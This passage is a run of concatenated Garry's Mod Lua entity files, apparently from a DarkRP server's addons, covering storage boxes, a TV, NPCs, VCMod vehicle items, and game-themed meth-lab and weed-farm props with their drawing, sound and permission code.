		Sound = "a5", Material = "leftmid", Label = "5", X = 119, Y = 86,
		Shift = { Sound = "b4", Material = "top", Label = "%", X = 136, Y = 31, TextX = 7, TextY = 90, Color = darker },
	},
	[KEY_6] =
	{
		Sound = "a6", Material = "rightmid", Label = "6", X = 144, Y = 86,
		Shift = { Sound = "b5", Material = "top", Label = "^", X = 164, Y = 31, TextX = 7, TextY = 90, Color = darker },
	},
	[KEY_7] = { Sound = "a7", Material = "right", Label = "7", X = 169, Y = 86 },
	[KEY_8] =
	{
		Sound = "a8", Material = "left", Label = "8", X = 194, Y = 86,
		Shift = { Sound = "b6", Material = "top", Label = "*", X = 208, Y = 31, TextX = 7, TextY = 90, Color = darker },
	},
	[KEY_9] =
	{
		Sound = "a9", Material = "middle", Label = "9", X = 219, Y = 86,
		Shift = { Sound = "b7", Material = "top", Label = "(", X = 239, Y = 31, TextX = 7, TextY = 90, Color = darker },
	},
	[KEY_0] = { Sound = "a10", Material = "right", Label = "0", X = 244, Y = 86 },
	[KEY_Q] =
	{
		Sound = "a11", Material = "left", Label = "q", X = 269, Y = 86,
		Shift = { Sound = "b8", Material = "top", Label = "Q", X = 283, Y = 31, TextX = 7, TextY = 90, Color = darker },
	},
	[KEY_W] =
	{
		Sound = "a12", Material = "leftmid", Label = "w", X = 294, Y = 86,
		Shift = { Sound = "b9", Material = "top", Label = "W", X = 310, Y = 31, TextX = 7, TextY = 90, Color = darker },
	}, // 310
	[KEY_E] =
	{
		Sound = "a13", Material = "rightmid", Label = "e", X = 319, Y = 86,
		Shift = { Sound = "b10", Material = "top", Label = "E", X = 339, Y = 31, TextX = 7, TextY = 90, Color = darker },
	}, // 339
	[KEY_R] = { Sound = "a14", Material = "right", Label = "r", X = 344, Y = 86 },
	[KEY_T] =
	{
		Sound = "a15", Material = "left", Label = "t", X = 369, Y = 86,
		Shift = { Sound = "b11", Material = "top", Label = "T", X = 383, Y = 31, TextX = 7, TextY = 90, Color = darker },
	}, // 383
	[KEY_Y] =
	{
		Sound = "a16", Material = "middle", Label = "y", X = 394, Y = 86,
		Shift = { Sound = "b12", Material = "top", Label = "Y", X = 414, Y = 31, TextX = 7, TextY = 90, Color = darker },
	}, // 415
	[KEY_U] = { Sound = "a17", Material = "right", Label = "u", X = 419, Y = 86 },
	[KEY_I] =
	{
		Sound = "a18", Material = "left", Label = "i", X = 444, Y = 86,
		Shift = { Sound = "b13", Material = "top", Label = "I", X = 458, Y = 31, TextX = 7, TextY = 90, Color = darker },
	}, // 459
	[KEY_O] =
	{
		Sound = "a19", Material = "leftmid", Label = "o", X = 469, Y = 86,
		Shift = { Sound = "b14", Material = "top", Label = "O", X = 486, Y = 31, TextX = 7, TextY = 90, Color = darker },
	}, // 486
	[KEY_P] =
	{
		Sound = "a20", Material = "rightmid", Label = "p", X = 494, Y = 86,
		Shift = { Sound = "b15", Material = "top", Label = "P", X = 514, Y = 31, TextX = 7, TextY = 90, Color = darker },
	}, // 515
	[KEY_A] = { Sound = "a21", Material = "right", Label = "a", X = 519, Y = 86 },
	[KEY_S] =
	{
		Sound = "a22", Material = "left", Label = "s", X = 544, Y = 86,
		Shift = { Sound = "b16", Material = "top", Label = "S", X = 558, Y = 31, TextX = 7, TextY = 90, Color = darker },
	}, // 559
	[KEY_D] =
	{
		Sound = "a23", Material = "middle", Label = "d", X = 569, Y = 86,
		Shift = { Sound = "b17", Material = "top", Label = "D", X = 590, Y = 31, TextX = 7, TextY = 90, Color = darker },
	}, // 590
	[KEY_F] = { Sound = "a24", Material = "right", Label = "f", X = 594, Y = 86 },
	[KEY_G] =
	{
		Sound = "a25", Material = "left", Label = "g", X = 619, Y = 86,
		Shift = { Sound = "b18", Material = "top", Label = "G", X = 633, Y = 31, TextX = 7, TextY = 90, Color = darker },
	}, // 633
	[KEY_H] =
	{
		Sound = "a26", Material = "leftmid", Label = "h", X = 644, Y = 86,
		Shift = { Sound = "b19", Material = "top", Label = "H", X = 661, Y = 31, TextX = 7, TextY = 90, Color = darker },
	}, // 661
	[KEY_J] =
	{
		Sound = "a27", Material = "rightmid", Label = "j", X = 669, Y = 86,
		Shift = { Sound = "b20", Material = "top", Label = "J", X = 690, Y = 31, TextX = 7, TextY = 90, Color = darker },
	}, // 690
	[KEY_K] = { Sound = "a28", Material = "right", Label = "k", X = 694, Y = 86 },
	[KEY_L] =
	{
		Sound = "a29", Material = "left", Label = "l", X = 719, Y = 86,
		Shift = { Sound = "b21", Material = "top", Label = "L", X = 734, Y = 31, TextX = 7, TextY = 90, Color = darker },
	}, // 734
	[KEY_Z] =
	{
		Sound = "a30", Material = "middle", Label = "z", X = 744, Y = 86,
		Shift = { Sound = "b22", Material = "top", Label = "Z", X = 765, Y = 31, TextX = 7, TextY = 90, Color = darker },
	}, // 765
	[KEY_X] = { Sound = "a31", Material = "right", Label = "x", X = 769, Y = 86 },
	[KEY_C] =
	{
		Sound = "a32", Material = "left", Label = "c", X = 794, Y = 86,
		Shift = { Sound = "b23", Material = "top", Label = "C", X = 809, Y = 31, TextX = 7, TextY = 90, Color = darker },
	}, // 809
	[KEY_V] =
	{
		Sound = "a33", Material = "leftmid", Label = "v", X = 819, Y = 86,
		Shift = { Sound = "b24", Material = "top", Label = "V", X = 837, Y = 31, TextX = 7, TextY = 90, Color = darker },
	}, // 837
	[KEY_B] =
	{
		Sound = "a34", Material = "rightmid", Label = "b", X = 844, Y = 86,
		Shift = { Sound = "b25", Material = "top", Label = "B", X = 865, Y = 31, TextX = 7, TextY = 90, Color = darker },
	}, // 865
	[KEY_N] = { Sound = "a35", Material = "right", Label = "n", X = 869, Y = 86 },
	[KEY_M] = { Sound = "a36", Material = "full", Label = "m", X = 894, Y = 86 },
}
--PATH addons/itemstore_new/lua/entities/itemstore_box_huge.lua:
ENT.Type = "anim"
ENT.Base = "itemstore_box"

ENT.PrintName = "Huge Box"
ENT.Category = "ItemStore"

ENT.Spawnable = true
ENT.AdminOnly = true

if SERVER then
	AddCSLuaFile()

	ENT.Model = "models/props_junk/wood_crate001a_damaged.mdl"

	ENT.ContainerWidth = 8
	ENT.ContainerHeight = 4
	ENT.ContainerPages = 2
end

--PATH gamemodes/darkrp/entities/entities/media_tv_large.lua:

AddCSLuaFile()

ENT.Base		= 'media_base'
ENT.PrintName	= 'Large TV'
ENT.Category 	= 'RP Media'
ENT.Spawnable	= true

ENT.MediaPlayer = true

ENT.Model 		= 'models/hunter/plates/plate2x3.mdl'

local color_black = Color(10, 10, 10)
function ENT:Initialize()
	self:SetMaterial('models/debug/debugwhite')
	self:SetColor(color_black)

	self.BaseClass.Initialize(self)
end

function ENT:CanUse(pl)
	return pl:IsSuperAdmin() or (pl == self:CPPIGetOwner())
end

if (CLIENT) then
	local vec = Vector(0,0,1.8)
	local ang = Angle(0,90,0)
	function ENT:Draw()
		self:DrawModel()
		cam.Start3D2D(self:LocalToWorld(vec), self:LocalToWorldAngles(ang), 0.074)
			self:DrawScreen(-960, -540, 1920, 1080)
		cam.End3D2D()
	end
end
--PATH addons/rptip/lua/entities/npc_ashot/shared.lua:
ENT.Base = "base_ai"
ENT.Type = "ai"
ENT.AutomaticFrameAdvance = true
ENT.PrintName = rp_box.NPC_name
ENT.Author = "Arthur"
ENT.Category = "@GambitEnts"
ENT.Spawnable = true
ENT.AdminSpawnable = true
 
function ENT:SetAutomaticFrameAdvance( bUsingAnim )
	self.AutomaticFrameAdvance = bUsingAnim
end
--PATH addons/111mod/lua/entities/npc_donate/cl_init.lua:
include( 'shared.lua' )
 
surface.CreateFont( "npc", {
	font = "Arial",
	size = 40,
	weight = 800,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = true,
	additive = false,
	outline = false,
})

surface.CreateFont( "npc2", {
	font = "Arial",
	size = 30,
	weight = 600,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = true,
	additive = false,
	outline = false,
})

local color_white = Color(255,255,255)
local color_black = Color(0,0,0)
local complex_off = Vector(0, 0, 9)
local ang = Angle(0, 90, 90)

local cam_End3D2D, cam_Start3D2D, LocalPlayer, CurTime, draw_SimpleTextOutlined, math_sin = cam.End3D2D, cam.Start3D2D, LocalPlayer, CurTime, draw.SimpleTextOutlined, math.sin

function ENT:Draw()
	self:DrawModel()
	local bone = self:LookupBone('ValveBiped.Bip01_Head1')
	pos = self:GetBonePosition(bone) + complex_off
	ang.y = (LocalPlayer():EyeAngles().y - 90)
	local x = math_sin(CurTime() * math.pi) * 30

	if (LocalPlayer():GetPos():Distance(self:GetPos()) < 200 or LocalPlayer():GetEyeTrace().Entity == self) then
		cam_Start3D2D(pos, ang, 0.03)
		draw_SimpleTextOutlined('Донат', '3d2d', 0, 0, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM, 1, color_black)
		cam_End3D2D()
	end
end
--PATH addons/111mod/lua/entities/trashcontainer/shared.lua:
ENT.Type = "anim"
ENT.Base = "base_gmodentity"

ENT.PrintName = "Trash Container"
ENT.Author = "ы"
ENT.Category = "@GambitEnts"

ENT.Spawnable = true
ENT.AdminSpawnable = false 
--PATH addons/vcmod_main_autoupdate/lua/entities/vc_fuel_station_electricity/cl_init.lua:
// Copyright © 2020 VCMod (freemmaann). All Rights Reserved. if you have any complaints or ideas contact me: steam - steamcommunity.com/id/freemmaann/ or email - freemmaann@gmail.com.

include('shared.lua')

ENT.RenderGroup = RENDERGROUP_BOTH

function ENT:Initialize() self.VC_PVsb = util.GetPixelVisibleHandle() end

local ID = "Fuel_station"
function ENT:Draw(...) if VC and VC.CodeEnt[ID] and VC.CodeEnt[ID].Draw then return VC.CodeEnt[ID].Draw(self, ...) end end
--PATH addons/vcmod_main_autoupdate/lua/entities/vc_pickup_engine/cl_init.lua:
// Copyright © 2020 VCMod (freemmaann). All Rights Reserved. if you have any complaints or ideas contact me: steam - steamcommunity.com/id/freemmaann/ or email - freemmaann@gmail.com.

include('shared.lua')

ENT.RenderGroup = RENDERGROUP_BOTH

function ENT:Initialize() self.VC_Color = Color(255,100,65,255) self.VC_Text = "Vehicle part" self.VC_PVsb = util.GetPixelVisibleHandle() end
--PATH addons/vcmod_main_autoupdate/lua/entities/vc_pickup_healthkit_10/shared.lua:
// Copyright © 2020 VCMod (freemmaann). All Rights Reserved. if you have any complaints or ideas contact me: steam - steamcommunity.com/id/freemmaann/ or email - freemmaann@gmail.com.
ENT.Base 		= "base_anim"
ENT.Type 		= "anim"
ENT.PrintName	= "Repair kit 10%"
ENT.Author		= "freemmaann"
ENT.Category	= "VCMod"

ENT.Spawnable = true
ENT.AdminSpawnable = true

--PATH addons/vcmod_main_autoupdate/lua/entities/vc_spikestrip/shared.lua:
// Copyright © 2020 VCMod (freemmaann). All Rights Reserved. if you have any complaints or ideas contact me: steam - steamcommunity.com/id/freemmaann/ or email - freemmaann@gmail.com.
ENT.Base 		= "base_anim"
ENT.Type 		= "anim"
ENT.PrintName	= "Spike strip"
ENT.Author		= "freemmaann"
ENT.Category	= "VCMod"

ENT.Spawnable = false
ENT.AdminSpawnable = false
--PATH addons/snowball/lua/entities/zck_snowballcrate/cl_init.lua:
include("shared.lua")

function ENT:Draw()
	self:DrawModel()
end

function ENT:DrawTranslucent()
	self:Draw()
end

function ENT:Initialize()
	self.UsedCrateCount = 0
end

function ENT:Think()
	local used = self:GetUsedCrateCount()
	if self.UsedCrateCount ~= used then
		self:EmitSound("zck_snowball_pickup")
		ParticleEffect("zck_snowball_pickup", self:GetPos() + self:GetUp() * 15, Angle(0, 0, 0), NULL)
		self.UsedCrateCount = used
	end
end

--PATH addons/zeros_methlab2/lua/entities/zmlab2_equipment/shared.lua:
ENT.Type = "anim"
ENT.Base = "base_anim"
ENT.Model = "models/zerochain/props_methlab/zmlab2_chest.mdl"
ENT.AutomaticFrameAdvance = true
ENT.Spawnable = true
ENT.AdminSpawnable = false
ENT.PrintName = "Equipment"
ENT.Category = "Zeros Methlab 2"
ENT.RenderGroup = RENDERGROUP_OPAQUE

function ENT:OnBuild(ply)
    local trace = ply:GetEyeTrace()
    local lp = self:WorldToLocal(trace.HitPos)

    if lp.x > -10 and lp.x < 10 and lp.y < 15 and lp.y > 13 and lp.z > 44 and lp.z < 51 then
        return true
    else
        return false
    end
end

function ENT:OnMove(ply)
    local trace = ply:GetEyeTrace()
    local lp = self:WorldToLocal(trace.HitPos)

    if lp.x > -10 and lp.x < 10 and lp.y < 15 and lp.y > 13 and lp.z > 37 and lp.z < 44 then
        return true
    else
        return false
    end
end

function ENT:OnRepair(ply)
    local trace = ply:GetEyeTrace()
    local lp = self:WorldToLocal(trace.HitPos)

    if lp.x > -10 and lp.x < 10 and lp.y < 15 and lp.y > 13 and lp.z > 30 and lp.z < 37 then
        return true
    else
        return false
    end
end

function ENT:OnRemoveButton(ply)
    local trace = ply:GetEyeTrace()
    local lp = self:WorldToLocal(trace.HitPos)

    if lp.x > -10 and lp.x < 10 and lp.y < 15 and lp.y > 13 and lp.z > 23 and lp.z < 30 then
        return true
    else
        return false
    end
end


function ENT:CanProperty(ply)
    return zmlab2.Player.IsAdmin(ply)
end

function ENT:CanTool(ply, tab, str)
    return zmlab2.Player.IsAdmin(ply)
end

function ENT:CanDrive(ply)
    return zmlab2.Player.IsAdmin(ply)
end

--PATH addons/zeros_methlab2/lua/entities/zmlab2_item_acid/shared.lua:
ENT.Type = "anim"
ENT.Base = "base_anim"
ENT.Model = "models/zerochain/props_methlab/zmlab2_acid.mdl"
ENT.AutomaticFrameAdvance = true
ENT.Spawnable = false
ENT.AdminSpawnable = false
ENT.PrintName = "Acid"
ENT.Category = "Zeros Methlab 2"
ENT.RenderGroup = RENDERGROUP_OPAQUE

function ENT:CanProperty(ply)
    return zmlab2.Player.IsAdmin(ply)
end

function ENT:CanTool(ply, tab, str)
    return zmlab2.Player.IsAdmin(ply)
end

function ENT:CanDrive(ply)
    return zmlab2.Player.IsAdmin(ply)
end

--PATH addons/zeros_methlab2/lua/entities/zmlab2_item_crate/cl_init.lua:
include("shared.lua")

function ENT:Initialize()
	zmlab2.Crate.Initialize(self)
end

function ENT:DrawTranslucent()
	self:Draw()
end

function ENT:Draw()
	self:DrawModel()
	zmlab2.Crate.Draw(self)
end

--PATH addons/zeros_methlab2/lua/entities/zmlab2_machine_filler/cl_init.lua:
include("shared.lua")

function ENT:Initialize()
	zmlab2.Filler.Initialize(self)
end

function ENT:DrawTranslucent()
	self:Draw()
end

function ENT:Draw()
	self:DrawModel()
	zmlab2.Filler.Draw(self)
end

function ENT:Think()
    zmlab2.Filler.Think(self)
end

function ENT:OnRemove()
    zmlab2.Filler.OnRemove(self)
end

--PATH addons/zeros_methlab2/lua/entities/zmlab2_machine_filter/cl_init.lua:
include("shared.lua")

function ENT:Initialize()
	zmlab2.Filter.Initialize(self)
end

function ENT:DrawTranslucent()
	self:Draw()
end

function ENT:Draw()
	self:DrawModel()
	zmlab2.Filter.Draw(self)
end

function ENT:OnRemove()
    zmlab2.Filter.OnRemove(self)
end

--PATH addons/zeros_methlab2/lua/entities/zmlab2_machine_filter/shared.lua:
ENT.Type = "anim"
ENT.Base = "base_anim"
ENT.Model = "models/zerochain/props_methlab/zmlab2_filter.mdl"
ENT.AutomaticFrameAdvance = true
ENT.Spawnable = true
ENT.AdminSpawnable = false
ENT.PrintName = "Filter"
ENT.Category = "Zeros Methlab 2"
ENT.RenderGroup = RENDERGROUP_OPAQUE

function ENT:SetupDataTables()

    // Corresponds to a ID from the MethTypes config (normal meth, blue meth)
    self:NetworkVar("Int", 1, "MethType")

    self:NetworkVar("Int", 2, "ProcessState")

    self:NetworkVar("Int", 3, "Progress")

    self:NetworkVar("Int", 4, "MethQuality")

    self:NetworkVar("Int", 5, "ErrorStart")


    if (SERVER) then
        self:SetMethType(1)
        self:SetProcessState(0)
        self:SetProgress(0)
        self:SetMethQuality(1)
        self:SetErrorStart(-1)
    end
end

function ENT:OnStart(ply)
    local trace = ply:GetEyeTrace()
    local lp = self:WorldToLocal(trace.HitPos)

    if lp.x > 0 and lp.x < 8 and lp.y < 15 and lp.y > 10 and lp.z > 27 and lp.z < 32 then
        return true
    else
        return false
    end
end

function ENT:OnErrorButton(ply)
    local trace = ply:GetEyeTrace()
    local lp = self:WorldToLocal(trace.HitPos)

    if lp.x > 0 and lp.x < 8 and lp.y < 15 and lp.y > 10 and lp.z > 25 and lp.z < 31.4 then
        return true
    else
        return false
    end
end


// Tell us if you allow to receive liquid
function ENT:AllowConnection(From_ent)
    if From_ent:GetClass() == "zmlab2_machine_mixer" and From_ent:GetProcessState() == 9 and self:GetProcessState() == 0 then
        return true
    else
        return false
    end
end

// Returns the start position and direction for a hose
function ENT:GetHose_In()
    local attach = self:GetAttachment(1)
    local ang = attach.Ang
    ang:RotateAroundAxis(ang:Right(),180)
    return attach.Pos,ang
end

// Returns the start position and direction for a hose
function ENT:GetHose_Out()
    local attach = self:GetAttachment(2)
    return attach.Pos,attach.Ang
end

function ENT:CanProperty(ply)
    return zmlab2.Player.IsAdmin(ply)
end

function ENT:CanTool(ply, tab, str)
    return zmlab2.Player.IsAdmin(ply)
end

function ENT:CanDrive(ply)
    return zmlab2.Player.IsAdmin(ply)
end

--PATH addons/zeros_methlab2/lua/entities/zmlab2_tent/cl_init.lua:
include("shared.lua")

function ENT:Initialize()
	zmlab2.Tent.Initialize(self)
end

function ENT:DrawTranslucent()
	self:Draw()
end

function ENT:Draw()
	self:DrawModel()
	zmlab2.Tent.Draw(self)
end

function ENT:Think()
	self:SetNextClientThink(CurTime())
	zmlab2.Tent.OnThink(self)

	return true
end

function ENT:OnRemove()
	zmlab2.Tent.OnRemove(self)
end

hook.Add("PhysgunPickup", "PPMethCl", function(ply, ent)
    if ent:IsValid() and string.StartWith(ent:GetClass(), "zmlab") then
		if ent:GetModel() != "models/zerochain/props_methlab/zmlab2_tentkit.mdl" then
        	return false 
		end
    end
end)
--PATH addons/zeros_weedfarm/lua/entities/zwf_backmix/shared.lua:
ENT.Type = "anim"
ENT.Base = "base_anim"
ENT.AutomaticFrameAdvance = true
ENT.Model = "models/zerochain/props_weedfarm/zwf_backmix_muffin.mdl"
ENT.Spawnable = false
ENT.AdminSpawnable = false
ENT.PrintName = "Muffin Mix"
ENT.Category = "Zeros GrowOP"
ENT.RenderGroup = RENDERGROUP_OPAQUE

--PATH addons/zeros_weedfarm/lua/entities/zwf_bong01_ent.lua:
AddCSLuaFile()
DEFINE_BASECLASS("zwf_bong_ent")
ENT.Type = "anim"
ENT.Base = "zwf_bong_ent"
ENT.Model = "models/zerochain/props_weedfarm/zwf_bong01.mdl"
ENT.Spawnable = true
ENT.AdminSpawnable = false
ENT.PrintName = "Cherry Bowl"
ENT.Category = "Zeros GrowOP"
ENT.RenderGroup = RENDERGROUP_TRANSLUCENT

ENT.BongID = 1

function ENT:SetupDataTables()
    self:NetworkVar("Int", 1, "WeedID")
    self:NetworkVar("String", 0, "Weed_Name")
    self:NetworkVar("Int", 2, "Weed_THC")
    self:NetworkVar("Int", 3, "Weed_Amount")
    self:NetworkVar("Bool", 0, "IsBurning")

    if (SERVER) then
        self:SetWeedID(-1)
        self:SetWeed_Name("Empty")
        self:SetWeed_THC(-1)
        self:SetWeed_Amount(0)
        self:SetIsBurning(false)
    end
end

--PATH addons/zeros_weedfarm/lua/entities/zwf_drystation/cl_init.lua:
include("shared.lua")

function ENT:Initialize()
	zwf.f.EntList_Add(self)
end

function ENT:Draw()
	self:DrawModel()
end

--PATH addons/zeros_weedfarm/lua/entities/zwf_edibles/cl_init.lua:
include("shared.lua")


function ENT:Draw()
	self:DrawModel()
end

function ENT:DrawTranslucent()
	self:Draw()
end

--PATH addons/zeros_weedfarm/lua/entities/zwf_fuel/cl_init.lua:
include("shared.lua")

function ENT:Initialize()
	zwf.f.EntList_Add(self)
end

function ENT:Draw()
	self:DrawModel()
end

--PATH addons/zeros_weedfarm/lua/entities/zwf_generator/cl_init.lua:
include("shared.lua")

function ENT:Initialize()
	zwf.f.EntList_Add(self)
	self.Cached_Rope = false
	self.RopeRefresh = true

	self.LastPowerLevel = -1

	self.AnimState = false
	self.IsRefilling = false
	self.Output = nil

	self.HasSmokeEffect = false
	self.HasDamagedEffect = false
end

function ENT:Draw()
	self:DrawModel()

	zwf.f.UpdateEntityVisuals(self)

	if GetConVar("zwf_cl_vfx_drawui"):GetInt() == 1 and zwf.f.InDistance(LocalPlayer():GetPos(), self:GetPos(), 300) then
		self:DrawScreenUI()
	end
end


function ENT:DrawScreenUI()

	local _maintance = self:GetMaintance()

	if _maintance < zwf.config.Generator.Maintance_time then
		local Pos01 = self:GetPos() + self:GetUp() * 3.5 + self:GetRight() * -6 + self:GetForward() * 19.15
		local Ang01 = self:GetAngles()
		Ang01:RotateAroundAxis(self:GetRight(),180)
		Ang01:RotateAroundAxis(self:GetForward(),90)
		Ang01:RotateAroundAxis(self:GetUp(),-90)

		cam.Start3D2D(Pos01, Ang01, 0.1)

			//Enable Button
			if self:EnableButton(LocalPlayer()) then
				if self.AnimState == 1 then

					surface.SetDrawColor(zwf.default_colors["red01"])
					surface.SetMaterial(zwf.default_materials["button_circle"])
					surface.DrawTexturedRect(-40, -90, 80, 80)
					draw.NoTexture()

					surface.SetDrawColor(zwf.default_colors["white01"])
					surface.SetMaterial(zwf.default_materials["switch"])
					surface.DrawTexturedRect(-30, -81, 60, 60)
					draw.NoTexture()

				else

					surface.SetDrawColor(zwf.default_colors["green02"])
					surface.SetMaterial(zwf.default_materials["button_circle"])
					surface.DrawTexturedRect(-40, -90, 80, 80)
					draw.NoTexture()

					surface.SetDrawColor(zwf.default_colors["white01"])
					surface.SetMaterial(zwf.default_materials["switch"])
					surface.DrawTexturedRect(-30, -81, 60, 60)
					draw.NoTexture()
				end
			else
				if self.AnimState == 1 then

					surface.SetDrawColor(zwf.default_colors["red02"])
					surface.SetMaterial(zwf.default_materials["button_circle"])
					surface.DrawTexturedRect(-40, -90, 80, 80)
					draw.NoTexture()

					surface.SetDrawColor(zwf.default_colors["white01"])
					surface.SetMaterial(zwf.default_materials["switch"])
					surface.DrawTexturedRect(-30, -81, 60, 60)
					draw.NoTexture()

				else
					surface.SetDrawColor(zwf.default_colors["green03"])
					surface.SetMaterial(zwf.default_materials["button_circle"])
					surface.DrawTexturedRect(-40, -90, 80, 80)
					draw.NoTexture()

					surface.SetDrawColor(zwf.default_colors["white01"])
					surface.SetMaterial(zwf.default_materials["switch"])
					surface.DrawTexturedRect(-30, -81, 60, 60)
					draw.NoTexture()
				end
			end
		cam.End3D2D()
	end

	local Pos = self:GetPos() + self:GetUp() * 29 + self:GetRight() * -17.5
	local Ang = self:GetAngles()
	Ang:RotateAroundAxis(self:GetRight(),90)
	Ang:RotateAroundAxis(self:GetForward(),90)
	Ang:RotateAroundAxis(self:GetUp(),-90)


	cam.Start3D2D(Pos, Ang, 0.1)

		if _maintance < zwf.config.Generator.Maintance_time then
			local _power = self:GetPower()

			draw.RoundedBox(5, -190 , 35, 380, 40,  zwf.default_colors["gray01"])

			//Power Bar
			if _power > 0 then

				local newPowerLvl = (380 / zwf.config.Generator.Power_storage) * _power
				newPowerLvl = math.Clamp(newPowerLvl,0,380)
				if self.LastPowerLevel ~= newPowerLvl then
					if newPowerLvl > self.LastPowerLevel then
						self.LastPowerLevel = self.LastPowerLevel + 50 * FrameTime()
						self.LastPowerLevel = math.Clamp(self.LastPowerLevel, 0, newPowerLvl)
					else
						self.LastPowerLevel = self.LastPowerLevel - 50 * FrameTime()
						self.LastPowerLevel = math.Clamp(self.LastPowerLevel, newPowerLvl, 380)
					end
				end

				draw.RoundedBox(5, -190 , 35, self.LastPowerLevel, 40,zwf.default_colors["power"])

			end
			draw.SimpleText( _power,"zwf_watertank_font01", 0, 55, zwf.default_colors["white01"], TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)

		else

			if _maintance >= zwf.config.Generator.Maintance_time then
				if self:MaintanceButton(LocalPlayer()) then
					surface.SetDrawColor(zwf.default_colors["black01"])
					surface.SetMaterial(zwf.default_materials["shadow_circle"])
					surface.DrawTexturedRect(-300, 5, 600, 140)
					draw.NoTexture()
					draw.SimpleText(">> " .. zwf.language.General["generator_repair"] .. " <<", "zwf_generator_font01", 0, 10, Color(237, 108, 108, math.abs(math.sin(RealTime() * math.pi * 5)) * 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP)
					draw.SimpleText(">> " .. zwf.language.General["generator_repair"] .. " <<", "zwf_generator_font02", 0, 10, Color(203, 60, 60, math.abs(math.sin(RealTime() * math.pi * 5)) * 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP)
				else
					draw.SimpleText(">> " .. zwf.language.General["generator_repair"] .. " <<", "zwf_generator_font01", 0, 10, Color(203, 60, 60, math.abs(math.sin(RealTime() * math.pi * 5)) * 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP)
				end
			end
		end
	cam.End3D2D()



	cam.Start3D2D(self:LocalToWorld(Vector(8, 0, 40)), Angle(0, EyeAngles().y - 90, -EyeAngles().x + 90), 0.1)

		draw.SimpleText(zwf.language.General["Fuel"] .. ": " .. self:GetFuel() .. zwf.config.UoL, "zwf_generator_font03", 0, 5, zwf.default_colors["white01"], TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
	cam.End3D2D()
end

function ENT:OnVolumeChange()

	if self.SoundObj and self.SoundObj:IsPlaying() == true then
		self.SoundObj:ChangeVolume(zwf_SoundVolume, 0)
	end

	if self.SoundObj_Damaged and self.SoundObj_Damaged:IsPlaying() == true then
		self.SoundObj_Damaged:ChangeVolume(zwf_SoundVolume, 0)
	end
end

function ENT:Think()

	if zwf.f.InDistance(LocalPlayer():GetPos(), self:GetPos(), 1000) then

		local _Output = self:GetOutput()
		if self.Output ~= _Output then
			self.Output = _Output

			if IsValid(self.Output) then
				self:SetBodygroup(9,1)
			else
				self:SetBodygroup(9,0)
			end
		end

		if self:GetMaintance() >= zwf.config.Generator.Maintance_time then

			self:Generator_Damaged_VFX()
		else

			if self.SoundObj_Damaged and self.SoundObj_Damaged:IsPlaying() == true then
				self.SoundObj_Damaged:ChangeVolume(0, 0)
				self.SoundObj_Damaged:Stop()
			end

			if self.HasDamagedEffect then
				self:StopParticlesNamed("zwf_damaged")
				self.HasDamagedEffect = false
			end

			self:Generator_Running_VFX()
		end



		local _animstate = self:GetAnimState()
		if self.AnimState ~= _animstate then
			self.AnimState = _animstate

			if _animstate == 0 then

				zwf.f.ClientAnim(self, "idle", 1)
			elseif _animstate == 1 then
				zwf.f.ClientAnim(self, "running", 1)
			elseif _animstate == 2 then
				zwf.f.ClientAnim(self, "damaged", 1)
			end
		end


		local _isrefilling = self:GetIsRefilling()
		if self.IsRefilling ~= _isrefilling then
			self.IsRefilling = _isrefilling

			if self.IsRefilling then
				self:SetBodygroup(8, 1)
			else
				self:SetBodygroup(8, 0)
			end
		end

	else
		self.IsDamaged = false
		self.AnimState = -1
		self.Output = nil

		if self.HasSmokeEffect then
			self:StopParticlesNamed("zwf_exaust")
			self.HasSmokeEffect = false
		end

		if self.SoundObj and self.SoundObj:IsPlaying() == true then
			self.SoundObj:ChangeVolume(0, 0)
			self.SoundObj:Stop()
		end


		if self.HasDamagedEffect then
			self:StopParticlesNamed("zwf_damaged")
			self.HasDamagedEffect = false
		end

		if self.SoundObj_Damaged and self.SoundObj_Damaged:IsPlaying() == true then
			self.SoundObj_Damaged:ChangeVolume(0, 0)
			self.SoundObj_Damaged:Stop()
		end
	end

	self:SetNextClientThink(CurTime())
	return true
end

function ENT:Generator_Running_VFX()
	if self.AnimState == 1 then


		if self.HasSmokeEffect == false then

			zwf.f.ParticleEffectAttach("zwf_exaust", PATTACH_POINT_FOLLOW, self, 1)

			self.HasSmokeEffect = true
		end

		if self.SoundObj == nil then
			self.SoundObj = CreateSound(self, "zwf_generator_running")
		end

		if self.SoundObj:IsPlaying() == false then
			self.SoundObj:Play()
			self.SoundObj:ChangeVolume(0, 0)
			self.SoundObj:ChangeVolume(zwf_SoundVolume * 0.7, 0)
		end
	elseif self.AnimState == 0 then

		if self.SoundObj and self.SoundObj:IsPlaying() == true then
			self.SoundObj:ChangeVolume(0, 0)
			self.SoundObj:Stop()
			zwf.f.EmitSoundENT("zwf_generator_stop", self)
		end

		if self.HasSmokeEffect then
			self:StopParticlesNamed("zwf_exaust")
			self.HasSmokeEffect = false
		end
	end
end


function ENT:Generator_Damaged_VFX()

	if self.HasDamagedEffect == false then
		zwf.f.ParticleEffectAttach("zwf_damaged", PATTACH_POINT_FOLLOW, self, 0)
		self.HasDamagedEffect = true
	end

	if self.SoundObj_Damaged == nil then
		self.SoundObj_Damaged = CreateSound(self, "zwf_generator_damaged")
	end

	if self.SoundObj_Damaged:IsPlaying() == false then
		self.SoundObj_Damaged:Play()
		self.SoundObj_Damaged:ChangeVolume(0, 0)
		self.SoundObj_Damaged:ChangeVolume(zwf_SoundVolume * 0.7, 0)
	end
end


function ENT:OnRemove()
	if self.HasSmokeEffect then
		self:StopParticlesNamed("zwf_exaust")
		self.HasSmokeEffect = false
	end

	if self.SoundObj and self.SoundObj:IsPlaying() == true then
		self.SoundObj:ChangeVolume(0, 0)
		self.SoundObj:Stop()
	end


	if self.HasDamagedEffect then
		self:StopParticlesNamed("zwf_damaged")
		self.HasDamagedEffect = false
	end

	if self.SoundObj_Damaged and self.SoundObj_Damaged:IsPlaying() == true then
		self.SoundObj_Damaged:ChangeVolume(0, 0)
		self.SoundObj_Damaged:Stop()
	end
end


function ENT:UpdateVisuals()

	if IsValid(self.Output) then
		self:SetBodygroup(9,1)
	else
